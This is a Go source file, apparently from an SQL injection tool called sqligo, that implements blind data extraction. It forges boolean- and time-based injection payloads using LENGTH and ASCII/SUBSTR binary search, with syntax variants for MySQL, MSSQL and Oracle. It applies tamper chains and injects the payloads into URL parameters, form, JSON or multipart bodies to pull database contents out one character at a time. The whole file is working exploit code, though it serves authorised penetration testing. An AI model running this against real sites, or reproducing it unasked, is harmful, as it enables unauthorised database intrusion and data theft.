package extractor

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"regexp"

	"github.com/R0X4R/sqligo/pkg/config"
	"github.com/R0X4R/sqligo/pkg/logger"
	"github.com/R0X4R/sqligo/pkg/request"
	"github.com/R0X4R/sqligo/pkg/tamper"
	"github.com/R0X4R/sqligo/pkg/utils"
)

// BinarySearch extracts data using bitwise/binary search algorithm concurrently
func (e *Extractor) BinarySearch(query string, chars []string) string {
	// 1. Get Length of the result first
	length := e.GetLength(query)
	if length == 0 {
		logger.Error("Failed to retrieve length for query: %s", query)
		return ""
	}
	logger.Info("Retrieved length: %d", length)

	// 2. Prepare for concurrency
	result := make([]string, length)
	var wg sync.WaitGroup

	// Create a job channel
	type job struct {
		index int
	}
	jobs := make(chan job, length)

	// Determine worker count (default 10 or from config if we had it)
	workerCount := 10
	if length < workerCount {
		workerCount = length
	}

	// Start workers
	for w := 0; w < workerCount; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				char := e.extractChar(query, j.index)
				result[j.index-1] = char
				// Progress indicator (simple)
				// fmt.Printf("\rExtracted: %s", strings.Join(result, ""))
			}
		}()
	}

	// Send jobs
	for i := 1; i <= length; i++ {
		jobs <- job{index: i}
	}
	close(jobs)

	// Wait
	wg.Wait()

	finalRes := strings.Join(result, "")
	// logger.Success("Extracted: %s", finalRes)
	return finalRes
}

func (e *Extractor) GetLength(query string) int {
	// Use binary search to find length
	// Payload: LENGTH(query) > X
	// Adjust syntax for DBMS
	lenFunc := "LENGTH"
	if e.Backend == "Microsoft SQL Server" {
		lenFunc = "LEN"
	} else if e.Backend == "Oracle" {
		lenFunc = "LENGTH"
	}

	// Basic heuristic range 0 to 1000
	low := 0
	high := 1000 // Reasonable max length for names/small data

	for low <= high {
		mid := low + (high-low)/2
		// Payload: LEN((query)) > mid
		payload := fmt.Sprintf("%s((%s))>%d", lenFunc, query, mid)

		if e.CheckPayload(payload) {
			low = mid + 1
		} else {
			high = mid - 1
		}
	}
	return low
}

func (e *Extractor) extractChar(query string, index int) string {
	// Binary Search for Character (ASCII 0-127)
	low := 0
	high := 127

	for low <= high {
		mid := low + (high-low)/2

		// Payload: ASCII(SUBSTR((query), index, 1)) > mid
		payload := e.forgePayload(query, index, mid)

		if e.CheckPayload(payload) {
			low = mid + 1
		} else {
			high = mid - 1
		}
	}
	return string(rune(low))
}

func (e *Extractor) forgePayload(query string, index, mid int) string {
	// Handle DBMS specific substring/ascii syntax
	// MySQL: ORD(MID(str, pos, 1)) or ASCII(SUBSTRING(str, pos, 1))
	// PG: ASCII(SUBSTR(str, pos, 1))
	// MSSQL: ASCII(SUBSTRING(str, pos, 1))
	// Oracle: ASCII(SUBSTR(str, pos, 1))

	asciiFunc := "ASCII"
	subStrFunc := "SUBSTR"

	if e.Backend == "MySQL" {
		asciiFunc = "ORD"
		subStrFunc = "MID"
	} else if e.Backend == "Microsoft SQL Server" {
		subStrFunc = "SUBSTRING"
	}

	// Construct: ASCII(SUBSTR((query), index, 1)) > mid
	// NOTE: Enclosing query in () is safer
	return fmt.Sprintf("%s(%s((%s),%d,1))>%d", asciiFunc, subStrFunc, query, index, mid)
}

// CheckPayload executes the request and validates the truth condition
func (e *Extractor) CheckPayload(inference string) bool {
	// 1. Construct core payload
	fullPayload := strings.Replace(e.Vector, "[INFERENCE]", inference, 1) // e.Vector should be raw payload
	// Replace [SLEEPTIME] if present (common in time-based vectors)
	sleepTime := config.GlobalConfig.TimeSec
	if sleepTime == 0 {
		sleepTime = 5
	}
	fullPayload = strings.Replace(fullPayload, "[SLEEPTIME]", fmt.Sprintf("%d", sleepTime), 1)

	// 2. Apply Prefix/Suffix
	if config.GlobalConfig != nil {
		if config.GlobalConfig.Prefix != "" {
			fullPayload = config.GlobalConfig.Prefix + fullPayload
		}
		if config.GlobalConfig.Suffix != "" {
			fullPayload = fullPayload + config.GlobalConfig.Suffix
		}

		// 3. Apply tamper scripts if configured
		if len(config.GlobalConfig.Tamper) > 0 {
			fullPayload = tamper.ApplyChain(fullPayload, config.GlobalConfig.Tamper)
		}
	}

	var injectedUrl string
	var injectedData string

	if e.Data != "" {
		// Assume Form Data unless we have state.
		// Actually Extractor should know if it's JSON/Multipart.
		// But e.Data is just string.
		// We will do robust replace.
		if config.GlobalConfig.IsJson {
			// Basic JSON Replace: "param": "value" -> "param": "valuePayload"
			// Assuming key is unique.
			injectedData = strings.Replace(e.Data, fmt.Sprintf(`"%s": "`, e.Parameter), fmt.Sprintf(`"%s": "`, e.Parameter)+utils.UrlEncode(fullPayload), 1)
		} else if config.GlobalConfig.IsMultipart {
			injectedData = utils.ReplaceMultipartValue(e.Data, e.Parameter, "1"+utils.UrlEncode(fullPayload)) // Assuming value '1'
		} else {
			injectedData = strings.Replace(e.Data, e.Parameter+"=1", e.Parameter+"=1"+utils.UrlEncode(fullPayload), 1)
			// Fallback if value wasn't 1?
			// But here we construct fresh.
			// If Replace failed (string unchanged), try appending to end?
			if injectedData == e.Data {
				// Maybe parameter value is different.
				// Try replacing `param=` with `param=payload` (clearing value)
				// Or assume it's `param=val`
			}
		}
		injectedUrl = e.Url
	} else {
		// GET
		sep := "?"
		if strings.Contains(e.Url, "?") {
			sep = "&"
		}

		// Check if parameter exists
		if strings.Contains(e.Url, e.Parameter+"=") {
			// Replace `param=val` with `param=valPayload`
			// Regex or Split?
			// Simple: Replace `param=` with `param=` + payload (but wait, value is there)
			injectedUrl = strings.Replace(e.Url, e.Parameter+"=", e.Parameter+"=1"+utils.UrlEncode(fullPayload), 1)
			// Note: This replaces `id=` with `id=1...`. If id=5, result `id=5` stays? No, `id=` matches.
			// Actually `strings.Replace(s, "id=", "id=1"+payload)` yields `...id=1payload...5...` ?? No.
			// `id=5` -> `id=1payload5`. This is messy.
			// Correct way: Replace `id=[^&]*`
			re := regexp.MustCompile(regexp.QuoteMeta(e.Parameter) + `=[^&]*`)
			injectedUrl = re.ReplaceAllString(e.Url, e.Parameter+"=1"+utils.UrlEncode(fullPayload))
		} else {
			injectedUrl = e.Url + sep + e.Parameter + "=" + utils.UrlEncode(fullPayload)
		}
	}

	req := request.NewRequest(injectedUrl)
	if injectedData != "" {
		req.Data = injectedData
	}

	start := time.Now()
	resp, err := req.Execute()
	if err != nil {
		return false
	}
	duration := time.Since(start)

	// Time-Based Check
	// If the vector (from detection) was time-based, we expect delay.
	// How do we know it's time based? e.Vector usually implies it, checking logic:
	// If e.Vector includes "SLEEP" or "WAITFOR", it's time based.
	// Or we pass `IsTimeBased` to Extractor.
	// Heuristic: If config.Delay is set or if duration > threshold (e.g. 5s)
	// But binary search for TimeBased uses "IF(cond, SLEEP(5), 0)".
	// So if TRUE -> SLEEP.
	if duration.Seconds() >= float64(5) {
		return true
	}

	// Boolean-Based Check
	// Using Levenshtein Ratio
	if e.BaseBody != "" {
		ratio := utils.GetRatio(e.BaseBody, resp.Body)
		// Logic:
		// True Query -> Response similar to Original -> High Ratio
		// False Query -> Response different (error/empty) -> Low Ratio
		if ratio >= 0.95 {
			return true
		}
		return false
	}

	// Fallback if no basebody (shouldn't happen with new Init)
	return resp.StatusCode == 200
}
